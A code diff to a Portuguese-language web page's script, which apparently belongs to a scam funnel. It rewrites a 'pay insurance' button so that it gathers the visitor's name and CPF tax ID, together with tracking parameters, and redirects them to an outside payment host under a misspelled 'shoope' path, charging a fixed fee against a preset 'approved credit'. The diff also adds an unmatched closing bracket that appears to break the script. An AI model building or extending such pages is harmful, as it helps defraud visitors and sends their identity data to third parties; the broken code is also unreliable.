@@ -839,6 +839,39 @@
     </div>
 
     <script>
+      // Função para preservar parâmetros importantes (UTM, tracking, etc.)
+      function preserveImportantParams() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const importantParams = [
+          "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "utm_id",
+          "fbclid", "gclid", "xcod", "src", "referrer", "source"
+        ];
+        
+        const preservedParams = new URLSearchParams();
+        
+        importantParams.forEach((param) => {
+          if (urlParams.has(param)) {
+            preservedParams.set(param, urlParams.get(param));
+          }
+        });
+        
+        return preservedParams;
+      }
+
+      // Função para criar URL com todos os parâmetros preservados
+      function createUrlWithParams(baseUrl, additionalParams = {}) {
+        const preservedParams = preserveImportantParams();
+        
+        // Adicionar parâmetros adicionais
+        Object.entries(additionalParams).forEach(([key, value]) => {
+          if (value) {
+            preservedParams.set(key, value);
+          }
+        });
+        
+        return `${baseUrl}?${preservedParams.toString()}`;
+      }
+
       document.addEventListener("DOMContentLoaded", function () {
         // Garantir que a barra de progresso esteja corretamente inicializada
         const barraProgresso = document.getElementById(
@@ -1375,12 +1408,50 @@
 
         // Botão de pagar seguro
         btnPayInsurance.addEventListener("click", () => {
-          // Obtém todos os parâmetros da URL atual
-          const urlParams = new URLSearchParams(window.location.search);
-          // Adiciona parâmetro valor fixo
-          urlParams.set("valor", "2990");
-          // Redireciona mantendo todos os parâmetros
-          window.location.href = `https://www.seguropagamentos.com.br/shoope?${urlParams.toString()}`;
+          // Coleta dados do localStorage
+          const nomeUsuario = localStorage.getItem("nomeUsuario") || "";
+          const cpfUsuario = localStorage.getItem("cpfUsuario") || "";
+          const valorAprovado = localStorage.getItem("creditoAprovado") || "7584";
+          
+            // Obtém parâmetros da URL atual
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            // Define a URL base
+            let redirectUrl = "https://www.seguropagamentos.com.br/shoope";
+            
+            // Array para armazenar os parâmetros
+            const parametros = [];
+            
+            // Adiciona nome (prioriza localStorage, depois URL)
+            if (nomeUsuario) {
+            parametros.push(`nome=${encodeURIComponent(nomeUsuario)}`);
+            } else if (urlParams.get("nome")) {
+            parametros.push(`nome=${encodeURIComponent(urlParams.get("nome"))}`);
+            }
+            
+            // Adiciona CPF apenas da URL atual (não salva no localStorage)
+            if (urlParams.get("cpf")) {
+            parametros.push(`cpf=${encodeURIComponent(urlParams.get("cpf"))}`);
+            }
+            
+            // Adiciona valor fixo para o seguro
+            parametros.push("valor=2990");
+            
+            // Preserva outros parâmetros importantes da URL atual se existirem
+            const parametrosImportantes = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "fbclid", "gclid"];
+            parametrosImportantes.forEach(param => {
+            if (urlParams.get(param)) {
+              parametros.push(`${param}=${encodeURIComponent(urlParams.get(param))}`);
+            }
+            });
+            
+            // Constrói a URL final
+            if (parametros.length > 0) {
+            redirectUrl += "?" + parametros.join("&");
+            }
+            
+            // Redireciona com todos os parâmetros
+            window.location.href = redirectUrl;
         });
 
         // Configuração de notificações de prova social
@@ -1726,6 +1797,8 @@
         // Garantir que o vídeo seja carregado
         videoElement.addEventListener("loadedmetadata", () => {
           videoElement.play();
+        });
+
         });
 
         // Event listener para o botão de play
